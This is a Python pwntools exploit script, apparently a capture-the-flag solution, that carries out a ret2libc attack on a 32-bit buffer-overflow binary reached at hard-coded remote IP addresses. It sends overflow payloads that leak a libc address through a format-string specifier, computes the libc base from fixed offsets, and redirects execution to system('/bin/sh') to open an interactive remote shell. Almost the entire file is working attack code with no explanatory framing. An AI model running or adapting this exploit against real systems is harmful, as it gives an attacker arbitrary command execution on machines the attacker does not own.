# ret2libc

from pwn import *
# r = remote("45.77.245.244",5001)
r = remote("34.94.172.42", 2021)
# r = process("./bof1")
# gdb.attach(r)

print(r.recv())

payload = "a"*32 + p32(0x80483c0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload)
r.sendline("%10$p")

# payload1 = "a"*32 + p32(0x80483c0) + p32(0x080485b1) + p32(0x0804aa00)
# r.sendline(payload1)
# r.sendline("/bin/sh\x00")

payload1 = "a"*32 + p32(0x80483b0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload1)
r.recv()
str_addr = r.recv()[59:69]
# str_addr = r.recv()[106:116]

print(str_addr)
rand_libcaddr = int(str_addr, 16)

rand_offset = 241 + 0x00018550 + 6 # __libc_start_main+241 on local +247 on remote
# rand_offset = 102177

libc_base = rand_libcaddr - rand_offset
print(hex(libc_base))

# system_offset = 0x0003ce10
system_offset = 0x0003a950

# binsh_offset = 0x17b88f
binsh_offset = 0x15910b

# exit_offset = 0x00030060
exit_offset = 0x0002e7c0

payload2 = "a"*32 + p32(libc_base + system_offset) + p32(libc_base + exit_offset) + p32(libc_base + binsh_offset)
r.sendline(payload2)

r.interactive()